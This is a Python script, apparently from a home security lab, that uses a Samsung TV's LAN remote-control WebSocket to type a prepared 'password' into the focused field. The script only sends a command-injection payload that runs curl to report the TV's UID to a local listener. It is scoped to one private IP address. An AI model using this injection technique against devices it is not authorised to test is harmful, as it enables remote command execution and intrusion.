"""Type a prepared DansTV probe password through Samsung's LAN remote-input API.

Uses the owner-authorised Samsung remote WebSocket (WSS port 8002) and
only sends text to the field the user explicitly focused. It does not
press Enter, navigate the TV, launch apps or run an exploit by itself.

Dependency: py -m pip install websocket-client
"""
from __future__ import annotations
import argparse
import base64
import json
from pathlib import Path
import re
import ssl
import sys
import time
from urllib.parse import urlencode

ROOT = Path(__file__).resolve().parents[2]
LAB = ROOT / ".local" / "tiz0wn-lab"
TV_FILE = ROOT / ".local" / "device.json"
TOKEN_FILE = LAB / "tv-remote-token.txt"
ENV_FILE = LAB / "lab.env"
BACKUP_FILE = LAB / "lab.env.before-uid"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("pair", "send"))
    args = parser.parse_args()
    if not TV_FILE.is_file():
        raise SystemExit("Missing .local/device.json (Q80T target).")
    host = json.loads(TV_FILE.read_text(encoding="utf-8")).get("host")
    if host != "192.168.50.169":
        raise SystemExit("Unexpected target TV; check the current Q80T IP first.")
    if args.action == "send":
        if not BACKUP_FILE.is_file() or not ENV_FILE.is_file():
            raise SystemExit("Run uid-probe.ps1 -Action Prepare first.")
        lines = ENV_FILE.read_text(encoding="ascii").splitlines()
        passwords = [line.removeprefix("TVPROBE_PASSWORD=") for line in lines
                     if line.startswith("TVPROBE_PASSWORD=")]
        if len(passwords) != 1:
            raise SystemExit("Unexpected number of lab password entries.")
        secret = passwords[0]
        if not re.fullmatch(r"\$\(/usr/bin/curl\$\{IFS\}http://192\.168\.50\.\d+:8181/\$EUID\)", secret):
            raise SystemExit("Current lab password is not the prepared UID probe; refusing to send.")
    else:
        secret = None
    try:
        import websocket
    except ImportError:
        raise SystemExit("Install dependency once: py -m pip install websocket-client") from None
    token = TOKEN_FILE.read_text(encoding="ascii").strip() if TOKEN_FILE.exists() else ""
    name = base64.b64encode(b"DansTV Test Keyboard").decode("ascii")
    query = urlencode({"name": name, **({"token": token} if token else {})})
    url = f"wss://{host}:8002/api/v2/channels/samsung.remote.control?{query}"
    print("Connecting to Samsung TV's local remote-input channel.")
    if not token:
        print("On the TV, approve the 'DansTV Test Keyboard' remote-control request.")
    # Self-signed Samsung TV TLS certificate; exception is scoped to this
    # one RFC1918 host and socket, never process-wide.
    try:
        ws = websocket.create_connection(
            url, timeout=35,
            sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False},
        )
    except Exception as exc:
        raise SystemExit(f"Could not open Samsung remote channel: {exc}") from None
    try:
        accepted = False
        end = time.monotonic() + 35
        while time.monotonic() < end:
            try:
                event = json.loads(ws.recv())
            except Exception as exc:
                raise SystemExit(f"Samsung pairing did not complete: {exc}") from None
            if event.get("event") == "ms.channel.connect":
                new_token = event.get("data", {}).get("token")
                if new_token and re.fullmatch(r"[A-Za-z0-9_-]{1,128}", str(new_token)):
                    LAB.mkdir(parents=True, exist_ok=True)
                    TOKEN_FILE.write_text(str(new_token), encoding="ascii")
                accepted = True
                break
            if event.get("event") in ("ms.channel.unauthorized", "ms.error"):
                raise SystemExit("Samsung denied the remote input request.")
        if not accepted:
            raise SystemExit("No Samsung remote-control approval received.")
        if args.action == "pair":
            print("Paired. On TV focus the Remote PC PASSWORD box, then run the send command.")
            return 0
        print("Sending prepared text to the currently focused TV input (without pressing Enter)...")
        ws.send(json.dumps({
            "method": "ms.channel.emit",
            "params": {"event": "custom.remote.textReceived", "to": "broadcast"},
        }))
        ws.send(json.dumps({
            "method": "ms.remote.control",
            "params": {
                "Cmd": base64.b64encode(secret.encode("utf-8")).decode("ascii"),
                "DataOfCmd": "base64",
                "TypeOfRemote": "SendInputString",
            },
        }))
        time.sleep(1)
        print("Text command sent. Confirm the TV password field accepted it before connecting.")
        print("Some Samsung password fields reject external IME text; this cannot verify acceptance.")
        return 0
    finally:
        ws.close()


if __name__ == "__main__":
    sys.exit(main())
